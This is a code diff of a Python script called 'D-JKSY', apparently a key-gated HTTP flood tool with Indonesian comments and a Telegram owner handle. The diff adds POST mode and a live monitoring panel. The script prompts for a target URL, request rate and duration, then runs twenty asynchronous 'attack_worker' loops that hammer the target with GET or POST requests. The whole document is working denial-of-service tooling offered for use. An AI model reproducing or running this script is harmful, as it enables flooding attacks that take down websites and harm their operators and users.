@@ -4,91 +4,112 @@ from rich.console import Console
 from rich.panel import Panel
 
 console = Console()
-stats = {"total": 0, "success": 0, "failed": 0}
+stats = {"total": 0, "success": 0, "failed": 0, "latency": 0}
 
-def get_banner():
-    return """
-[bold red]    ____          _______  ______
-   / __ \        / / ___/ / ____/
-  / / / /  __   / /\__ \ / / __  
- / /_/ /  /_/  / /___/ // /_/ /  
-/_____/       /_//____/ \____/   [/]
-[bold white]   REAL-TIME DEBUG v9.0 - BY JOKESKYLS[/]
-    """
+def show_manual():
+    console.print("[bold red]>>> D-JKSY ELITE AUTHORITY ACTIVE <<<[/]", justify="center")
+    manual = """
+[bold white]                         D-JKSY OPERATIONAL MANUAL[/]                         
+┏━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━┓
+┃ Parameter ┃ Deskripsi                              ┃ Contoh Input        ┃
+┡━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━┩
+│ URL       │ Alamat target (Wajib pakai http/https) │ https://example.com │
+│ Mode      │ Metode pengiriman (GET atau POST)      │ GET                 │
+│ RPS       │ Requests Per Second (Kecepatan)        │ 10 - 30             │
+│ Duration  │ Lama pengetesan (detik)                │ 60                  │
+│ Owner     │ Kontak Telegram Developer              │ @nazisme1930        │
+└───────────┴────────────────────────────────────────┴─────────────────────┘
+[dim]* Gunakan RPS tinggi hanya jika perangkat & internet stabil.[/]
 
-async def attack_worker(url, rps_limit):
-    # Timeout diperketat agar jika server lemot langsung muncul FAILED
-    timeout = aiohttp.ClientTimeout(total=5)
+[bold red]── TIER S CONFIGURATION ──[/]
+"""
+    console.print(manual)
+
+async def attack_worker(url, mode, rps_limit):
+    timeout = aiohttp.ClientTimeout(total=10)
     delay = 1 / (rps_limit / 20) if rps_limit > 0 else 0
-    
     async with aiohttp.ClientSession(timeout=timeout) as session:
         while True:
-            now = datetime.now().strftime("%H:%M:%S")
             t1 = time.perf_counter()
             try:
-                headers = {"User-Agent": f"D-JKSY/9.0-{time.time()}"}
-                async with session.get(url, headers=headers) as resp:
-                    latency = (time.perf_counter() - t1) * 1000
+                headers = {"User-Agent": f"D-JKSY-V9/{time.time()}"}
+                if mode.upper() == "POST":
+                    req = session.post(url, headers=headers, data={"jksy": "v9"})
+                else:
+                    req = session.get(url, headers=headers)
+                async with req as resp:
+                    stats["latency"] = (time.perf_counter() - t1) * 1000
                     stats["total"] += 1
-                    
-                    if resp.status < 400:
-                        stats["success"] += 1
-                        console.print(f"[dim]{now}[/] [bold green]SENT[/] [white]=>[/] [cyan]{url}[/] [bold green]CODE:{resp.status}[/] [dim]({latency:.0f}ms)[/]")
-                    else:
-                        stats["failed"] += 1
-                        # Menampilkan pesan gagal jika server merespon dengan error (403, 502, dsb)
-                        console.print(f"[dim]{now}[/] [bold yellow]DBUG[/] [white]=>[/] [cyan]{url}[/] [bold yellow]FAILED CODE:{resp.status}[/]")
-            
-            except aiohttp.ClientConnectorError:
+                    if resp.status < 400: stats["success"] += 1
+                    else: stats["failed"] += 1
+            except:
                 stats["total"] += 1
                 stats["failed"] += 1
-                console.print(f"[dim]{now}[/] [bold red]FAIL[/] [white]=>[/] [red]CONNECTION REFUSED (SERVER DOWN?)[/]")
-            
-            except asyncio.TimeoutError:
-                stats["total"] += 1
-                stats["failed"] += 1
-                console.print(f"[dim]{now}[/] [bold red]FAIL[/] [white]=>[/] [red]REQUEST TIMEOUT[/]")
-                
-            except Exception as e:
-                stats["total"] += 1
-                stats["failed"] += 1
-                console.print(f"[dim]{now}[/] [bold red]FAIL[/] [white]=>[/] [red]ERROR: {str(e)[:20]}[/]")
-            
-            if delay > 0:
-                await asyncio.sleep(delay)
+            if delay > 0: await asyncio.sleep(delay)
+
+async def monitor(target, mode, duration):
+    start_time = time.time()
+    last_total = 0
+    
+    # Header Control Center
+    os.system('cls' if os.name == 'nt' else 'clear')
+    control_panel = f"""╭────────────────────────────── D-JKSY CONTROL CENTER ──────────────────────────────╮
+│ OWNER  : JOKESKYLS (@nazisme1930)                                                 │
+│ TARGET : {target[:45]} | MODE: {mode.upper():<7} │
+│ ENGINE : TIER S ACTIVE                                                            │
+╰───────────────────────────────────────────────────────────────────────────────────╯
+
+[bold white]TIME         RPS         LATENCY       SUCCESS         FAIL[/]
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
+    console.print(control_panel)
+
+    while time.time() - start_time < duration:
+        await asyncio.sleep(1)
+        current_total = stats["total"]
+        rps = current_total - last_total
+        last_total = current_total
+        
+        now = datetime.now().strftime("%H:%M:%S")
+        latency = f"{stats['latency']:.0f}ms"
+        
+        # Format baris data agar sejajar sesuai kolom
+        log_line = f"{now:<12} {rps:<11} {latency:<13} {stats['success']:<15} {stats['failed']}"
+        console.print(log_line)
 
 async def main():
     os.system('cls' if os.name == 'nt' else 'clear')
-    console.print(get_banner(), justify="center")
-    
-    # Auth Logic
     try:
         r = requests.get("https://raw.githubusercontent.com/iamkhy11/d-jksy/main/keys.txt", timeout=10)
         keys = [k.strip() for k in r.text.splitlines()]
     except:
-        console.print("[red][!] Authority Server Offline[/]")
+        console.print("[bold red][!] Authority Server Offline[/]")
         return
 
-    key_input = console.input("\n[bold white]ENTER KEY : [/]").strip()
+    console.print("[bold red]>>> D-JKSY AUTHORITY SYSTEM <<<[/]\n", justify="center")
+    key_input = console.input("[bold white]ACCESS KEY : [/]").strip()
+    
     if key_input not in keys:
-        console.print("[red][!] ACCESS DENIED[/]")
+        console.print("[bold red][!] UNKNOWN AUTHORITY[/]")
         return
-
-    # Parameters
-    target = console.input("[bold white]TARGET URL : [/]")
-    rps_val = int(console.input("[bold white]RPS LIMIT  : [/]"))
-    duration = int(console.input("[bold white]DURATION   : [/]"))
 
     os.system('cls' if os.name == 'nt' else 'clear')
-    console.print(get_banner(), justify="center")
+    show_manual()
     
-    workers = [attack_worker(target, rps_val) for _ in range(20)]
+    target   = console.input("[bold white] URL             : [/]").strip()
+    mode     = console.input("[bold white] Mode (GET/POST) : [/]").strip()
+    rps_val  = int(console.input("[bold white] Target RPS      : [/]"))
+    duration = int(console.input("[bold white] Duration (sec)  : [/]"))
+
+    # Menjalankan Attack dan Monitor secara bersamaan
+    workers = [attack_worker(target, mode, rps_val) for _ in range(20)]
+    monitor_task = asyncio.create_task(monitor(target, mode, duration))
+    
     try:
         await asyncio.wait_for(asyncio.gather(*workers), timeout=duration)
     except asyncio.TimeoutError:
         pass
-
-    console.print(f"\n[bold green]FINISH[/] | Success: {stats['success']} | Failed: {stats['failed']}")
+    
+    console.print(f"\n[bold green]FINISH[/] | Total Reqs: {stats['total']} | Owner: @nazisme1930")
 
 if __name__ == "__main__":
     asyncio.run(main())
